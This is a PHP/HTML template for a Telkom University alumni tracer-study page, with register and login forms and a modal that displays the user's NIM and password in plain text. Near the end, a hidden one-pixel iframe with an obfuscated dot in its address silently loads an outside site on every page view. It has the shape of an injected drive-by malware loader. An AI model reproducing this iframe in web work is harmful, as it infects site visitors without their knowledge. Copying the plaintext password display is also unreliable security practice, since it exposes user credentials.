

<!------ Include the above in your HEAD tag ---------->

<!---*************welcome this is my simple empty strap by John Niro Yumang ******************* -->

<!DOCTYPE html>
<html lang="en">
	<title><?= $data['page']?></title>

		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

	<head>
		<script src="<?= $this->base_url?>public/js/jquery-3.3.1.min.js"></script>
		<!---- jquery link local dont forget to place this in first than other script or link or may not work ---->
		
		<link rel="stylesheet" href="<?= $this->base_url?>public/css/bootstrap.css">
		<!---- boostrap.min link local ----->
		
		<link rel="stylesheet" href="<?= $this->base_url?>public/css/style.css">
		<!---- boostrap.min link local ----->

		<script src="<?= $this->base_url?>public/js/bootstrap.js"></script>
		<!---- Boostrap js link local ----->
		
		<!-- <link rel="icon" href="images/icon.png" type="image/x-icon" /> -->
		<!---- Icon link local ----->
		
	<link href="https://fonts.googleapis.com/css?family=Lobster" rel="stylesheet">
		<!---- Font awesom link local ----->
		<link href="css/style.css" rel="stylesheet">
	</head>
	<body background="../img/teluback.jpg">
	<div class="container-fluid">
		<div class="container">
			<br>
			<br>
			<h2 class="text-center" id="title"><b>TRACER STUDY</b></h2>
			 <p class="text-center">
				<small id="passwordHelpInline" class="text-muted"> Hai Akang Teteh.. Silakan register terlebih dahulu untuk mendapatkan akun Tracer Study ya..</small>
			</p>
				<?php if (isset($_SESSION['errortype'])) : ?>
				<div class="alert alert-<?= $_SESSION['errortype'];?>" role="alert">
  				<?= $_SESSION['msg'];?>
					<?php if ($_SESSION['errortype'] == "success") :?> 
					<button type="button" class="btn btn-primary text-align-right" data-toggle="modal" data-target="#exampleModal">Lihat akun!</button>
					<?php endif;?>
				</div>
				<?php endif;?>
 			<hr>
			<div class="row">
				<div class="col-md-5">
 					<form role="form" method="post" action="<?= $this->base_url;?>auth">
						<fieldset>							
							<p class="text-uppercase pull-center"><b>REGISTER</b></p>	
							
 							<div class="form-group">
								<input type="text" name="nama" id="nama" class="form-control input-lg" placeholder="Nama Lengkap" autocomplete="off" required>
							</div>

							<div class="form-group">	
    						<label>Prodi</label>
								<select class="form-control" name="prodi" autocomplete="off" required>
									  <option value="S2 Teknik Elektro Komunikasi">S2 Teknik Elektro Komunikasi</option>
					                  <option value ="S2 Teknik Informatika">S2 Teknik Informatika</option>
					                  <option value="S2 Manajemen">S2 Manajemen</option>
					                  <option value="S1 Teknik Telekomunikasi">S1 Teknik Telekomunikasi</option>
					                  <option value="S1 Teknik Elektro">S1 Teknik Elektro</option>
					                  <option value="S1 Teknik Fisika">S1 Teknik Fisika</option>
					                  <option value="S1 Sistem Komputer">S1 Sistem Komputer</option>
					                  <option value="S1 Teknik Industri">S1 Teknik Industri</option>
					                  <option value="S1 Sistem Informasi">S1 Sistem Informasi</option>
					                  <option value="S1 Teknik Informatika">S1 Teknik Informatika</option>
					                  <option value="S1 Ilmu Komputasi">S1 Ilmu Komputasi</option>
					                  <option value="S1 Manajemen Bisnis Telekomunikasi & Informatika">S1 Manajemen Bisnis Telekomunikasi & Informatika</option>
					                  <option value="S1 International ICT Business">S1 International ICT Business</option>
					                  <option value="S1 Akuntansi">S1 Akuntansi</option>
					                  <option value="S1 Administrasi Bisnis">S1 Administrasi Bisnis</option>
					                  <option value="S1 Ilmu Komunikasi">S1 Ilmu Komunikasi</option>
					                  <option value="S1 Desain Komunikasi Visual">S1 Desain Komunikasi Visual</option>
					                  <option value="S1 Seni Rupa Murni">S1 Seni Rupa Murni</option>
					                  <option value="S1 Desain Interior">S1 Desain Interior</option>
					                  <option value="S1 Desain Produk">S1 Desain Produk</option>
					                  <option value="S1 Kriya Tekstil dan Mode">S1 Kriya Tekstil dan Mode</option>
					                  <option value="D3 Teknik Telekomunikasi">D3 Teknik Telekomunikasi</option>
					                  <option value="D3 Teknik Informatika">D3 Teknik Informatika</option>
					                  <option value="D3 Manajemen Informatika">D3 Manajemen Informatika</option>
					                  <option value="D3 Teknik Komputer">D3 Teknik Komputer</option>
					                  <option value="D3 Komputerisasi Akuntansi">D3 Komputerisasi Akuntansi</option>
					                  <option value="D3 Manajemen Pemasaran">D3 Manajemen Pemasaran</option>
					                  <option value="D3 Perhotelan">D3 Perhotelan</option>
								</select>
							</div>
							<div class="form-check">
								<label class="form-check-label">
								  <input type="checkbox" class="form-check-input" required>
								  Saya menyetujui dengan ketentuan dan persyaratan Tracer Study Universitas Telkom
								</label>
							  </div>
							  <br>
 							<div>
 								<button type="submit" class="btn btn btn-primary" name="register">Register</button>
 							</div>
						</fieldset>
					</form>
				</div>
				
				<div class="col-md-2">
					<!-------null------>
				</div>
				
				<div class="col-md-5">
 				 		<form role="form"  method="post" action="<?= $this->base_url?>auth">
						<fieldset>							
							<p class="text-uppercase"><b> LOGIN  </b></p>	
 								
							<div class="form-group">
								<input type="number" name="nim" class="form-control input-lg" placeholder="NIM" required>
							</div>
							<div class="form-group">
								<input type="password" name="password" class="form-control input-lg" placeholder="Password" required>
							</div>
							<div>
							<button type="submit" class="btn btn btn-primary" name="login">login</button>
							</div>
								 
 						</fieldset>
				</form>	
				</div>
			</div>


<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Tracer study</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
				<form>
					<small class="text-muted">NIM dan password digunakan untuk login</small>
					<div class="form-group">
						<label>NIM</label>
						<input class="form-control" value="<?= $_SESSION['nim'];?>" readonly>
					</div>
					<div class="form-group">
						<label >Password</label>
						<input class="form-control" type="text" id="password" value="<?= $_SESSION['password'];?>" readonly>
						<!-- <a href="#" class="badge badge-info show">tampilkan</a> -->
					</div>
				</form>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>

<!-- <script>
	$('.show').on('click', function(){
		console.log('okee');
	});
</script> -->
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
	 

</html>